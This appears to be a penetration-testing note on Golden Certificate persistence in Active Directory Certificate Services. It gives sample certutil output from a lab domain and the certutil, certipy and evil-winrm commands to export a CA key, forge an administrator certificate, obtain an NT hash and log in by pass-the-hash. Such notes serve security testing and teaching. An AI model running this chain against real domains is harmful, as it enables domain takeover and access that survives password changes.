# Golden Certificate

You can get full percistence in the domain if you get a certificate (from ADCS) wich includes de private key. This Golden Certificate can be used later to forge arbitrary certificate for any user in the domain.

Check certificates storages: 

`certutil -enumstore`

Check specific storage:

`certutil -store root` (or any store)

You will see multiple certificates. If any of those have `Signature test passed` and don't say anything about `Private key is NOT exportable`, like this example:

`
================ Certificate 8 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
No key provider information
  Provider = Microsoft Software Key Storage Provider
  Simple container name: Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  ERROR: missing key association property: CERT_KEY_IDENTIFIER_PROP_ID
Signature test passed
`

Then you may export this certificate:

`*Evil-WinRM* PS C:\programdata> certutil -exportPFX 75b2f4bbf31f108945147b466131bdca GoldenCertificate.pfx`

(Set password or just keep it empty.)

Now bring this file to your attacker machine, and use it to generate an administrator certificate (or any other user).

`certipy forge -ca-pfx 'GoldenCertificate.pfx' -upn 'administrator@<domain>'`

This should create brand new certificate.pfx you can use.

Finally use it to get NT hash of that user:

`certipy auth -pfx administrator_forged.pfx -dc-ip <ip> -domain <domain> -user Administrator`

Finally you just need to log in through pass the hash, using impacket suite, evil-winrm, etc.

`evil-winrm -i <ip> -u Administrator -H <NT hash>`

If users decide to change passwords, you can still forge and use certificates to get again the NT hash of that user.








